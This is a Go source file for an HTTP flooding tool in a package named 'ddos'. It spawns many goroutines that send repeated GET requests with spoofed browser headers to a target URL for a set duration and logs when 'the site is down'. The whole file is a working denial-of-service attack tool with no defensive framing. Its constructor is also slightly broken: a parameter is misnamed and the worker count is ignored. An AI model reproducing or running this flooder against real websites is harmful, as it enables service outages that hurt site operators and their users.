package ddos

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"runtime"
	"strings"
	"sync"
	"time"
)

func NewFlooder(url string, workerAmount, uint16, duration uint32) *flooder {
	ddos := &flooder{
		url: url,
		header: []string{
			"Accept:*/*",
			"Accept-Encoding:*",
			"Accept-Language:*",
			"Accept-Charset:*",
			"Connection:Keep-Alive",
			"Cache-Control:max-age=0",
			"User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
		},
		workerAmount: 0,
		client:       http.DefaultClient,
		stopSignal:   make(chan bool),
	}

	ddos.SetDuration(duration)
	return ddos
}

type Flooder interface {
	Flood()
	Stop()
	SetWorkerAmount(workers uint16)
	SetDuration(seconds uint32)
}

type flooder struct {
	url          string
	header       []string
	client       *http.Client
	workerAmount uint16
	stopSignal   chan bool
	startSignal  *chan bool
	duration     time.Duration
	wg           sync.WaitGroup
	timer        *time.Timer
}

func (f *flooder) Flood() {
	defaultRequest := f.configRequest()

	for idx := uint16(0); idx < f.workerAmount; idx++ {
		f.wg.Add(1)
		go func() {
			defer f.wg.Done()
			f.flood(defaultRequest)
		}()
	}

	f.timer = time.NewTimer(f.duration)

	select {
	case <-f.timer.C:
		fmt.Println("saiu")
		f.Stop()
		fmt.Println("saiu")

	}

	f.timer.Stop()
}

func (f flooder) configRequest() *http.Request {
	defaultRequest, err := http.NewRequest(http.MethodGet, f.url, nil)
	if err != nil {
		log.Fatal(err)
	}

	for _, header := range f.header {
		splitedHeader := strings.SplitN(header, ":", 2)
		if len(splitedHeader) == 2 {
			defaultRequest.Header.Add(strings.TrimSpace(splitedHeader[0]), strings.TrimSpace(splitedHeader[1]))
		}
	}

	return defaultRequest
}

func (f *flooder) flood(request *http.Request) {
	for {
		select {
		case <-f.stopSignal:
			return
		default:
			if f.startSignal != nil {
				<-(*f.startSignal)
			}

			resp, err := f.client.Do(request)
			if err == nil {
				fmt.Println("entrou")
				_, copyErr := io.Copy(io.Discard, resp.Body)
				closeErr := resp.Body.Close()
				if copyErr != nil || closeErr != nil {
					log.Printf("Error occurred during response body copy or close: %v, %v", copyErr, closeErr)
				}
			} else {
				log.Printf("THE SITE IS DOWN!!!  --> ERROR MSG: %v\n", err)
			}
		}
		runtime.Gosched()
	}
}

func (f *flooder) Stop() {
	close(f.stopSignal)
	f.wg.Wait()
}

func (f *flooder) SetWorkerAmount(workers uint16) {
	f.workerAmount = workers
}

func (f *flooder) SetDuration(seconds uint32) {
	f.duration = time.Duration(seconds) * time.Second
}

// func (f *flooder) WithStart() {
// 	f.startSignal
// }

// func (f *flooder) WithRoutineCounter() {

// }
